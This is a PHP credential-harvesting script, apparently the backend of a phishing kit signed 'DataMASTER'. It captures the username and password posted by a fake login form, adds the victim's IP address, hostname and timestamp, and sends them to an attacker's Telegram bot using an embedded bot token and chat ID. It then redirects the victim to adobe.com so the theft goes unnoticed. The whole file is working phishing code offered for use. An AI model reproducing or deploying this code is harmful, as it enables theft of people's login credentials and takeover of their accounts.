<?php
$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);

// Collect user input
$username = $_POST['customeru'];
$password = $_POST['customerp'];

// Format message for Telegram
$message = "🔴 *New Login Attempt* 🔴\n\n";
$message .= "👤 *Username:* `".$username."`\n";
$message .= "🔑 *Password:* `".$password."`\n\n";
$message .= "🕒 *Date:* ".$adddate."\n";
$message .= "🌐 *Host:* ".$host."\n";
$message .= "📍 *IP:* ".$ip."\n";
$message .= "------------- DataMASTER -------------";

// 🔹 Replace with your Telegram Bot API Token
$telegramBotToken = "7794527769:AAGME4TVgMq3kv_HhiBLmjDld4hwElO4LHk";

// 🔹 Replace with your Telegram Chat ID
$chatID = "7283094857";

// Send data to Telegram
$telegramUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
$params = [
    'chat_id' => $chatID,
    'text' => $message,
    'parse_mode' => 'Markdown' // Allows text formatting
];

$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($params),
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($telegramUrl, false, $context);

// Redirect after sending data
if ($result) {
    header("Location: https://adobe.com/"); // Redirect after success
} else {
    header("Location: index.html"); // Redirect if failed
}
?>
